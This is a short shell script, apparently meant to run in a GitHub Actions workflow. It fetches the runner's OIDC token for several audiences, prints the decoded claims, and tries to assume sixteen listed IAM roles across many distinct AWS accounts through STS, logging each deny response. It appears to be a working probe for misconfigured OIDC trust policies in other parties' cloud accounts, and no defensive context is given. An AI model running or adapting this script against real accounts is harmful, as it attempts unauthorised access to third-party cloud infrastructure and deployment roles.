#!/bin/sh
# OIDC probe: claims for 3 audiences + verbatim raw STS deny per ARN (environment sub shape)
set +e
echo "OIDC-PROBE repo=$GITHUB_REPOSITORY ref=$GITHUB_REF event=$GITHUB_EVENT_NAME"
U="$ACTIONS_ID_TOKEN_REQUEST_URL"; H="Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"
dec(){ python3 -c 'import base64,sys;p=sys.argv[1].split(".")[1];p+="="*(-len(p)%4);print(base64.urlsafe_b64decode(p).decode())' "$1" 2>/dev/null; }
SJ=""
for A in sts.amazonaws.com github-actions sigv4; do
  R=$(curl -s -w '\nHTTP %{http_code}' -H "$H" "$U&audience=$A")
  echo "=== AUD $A"; printf '%s\n' "$R" | tail -1
  J=$(printf '%s' "$R" | sed -n 's/.*"value":[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
  [ -n "$J" ] && { echo "CLAIMS($A): $(dec "$J")"; [ "$A" = sts.amazonaws.com ] && SJ="$J"; }
done
try(){ printf 'DENY %s aud=%s => ' "$1" "$2"
  curl -s -w ' [HTTP %{http_code}]' -d "Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleSessionName=oidc-v3&DurationSeconds=900&RoleArn=$1&WebIdentityToken=$3" https://sts.amazonaws.com/ | tr '\n' ' ' | cut -c1-400; echo; }
for ARN in \
 arn:aws:iam::245716815044:role/github-role \
 arn:aws:iam::818566830091:role/uquda-github-actions-deploy-dev \
 arn:aws:iam::211125730365:role/btqa-github-deploy \
 arn:aws:iam::222255905702:role/soleae-github-deploy \
 arn:aws:iam::222255905702:role/soleae-web-deploy \
 arn:aws:iam::296062593712:role/claude-code-bedrock-role \
 arn:aws:iam::296062593712:role/github-actions-cua-fleets-wif-smoke \
 arn:aws:iam::296062593712:role/github-actions-docs-pin-cua \
 arn:aws:iam::296062593712:role/github-actions-ecr-push-cua \
 arn:aws:iam::529088289252:role/CustomCrispDEVGitHubActionsRole \
 arn:aws:iam::533267451842:role/ai-orch-terraform-deployer \
 arn:aws:iam::864981749819:role/Customsupplier-risk-devGitHubActionsRole \
 arn:aws:iam::974396334757:role/github-actions-infra-ci \
 arn:aws:iam::975049931254:role/github-actions-image-resizer \
 arn:aws:iam::146376036780:role/github-actions-bedrock \
 arn:aws:iam::471112890962:role/github-actions-deploy ; do try "$ARN" sts.amazonaws.com "$SJ"; done
try arn:aws:iam::471112890962:role/github-actions-deploy github-actions "$(SJ=$SJ; echo "$SJ")"
echo "OIDC-V3 done"
exit 0
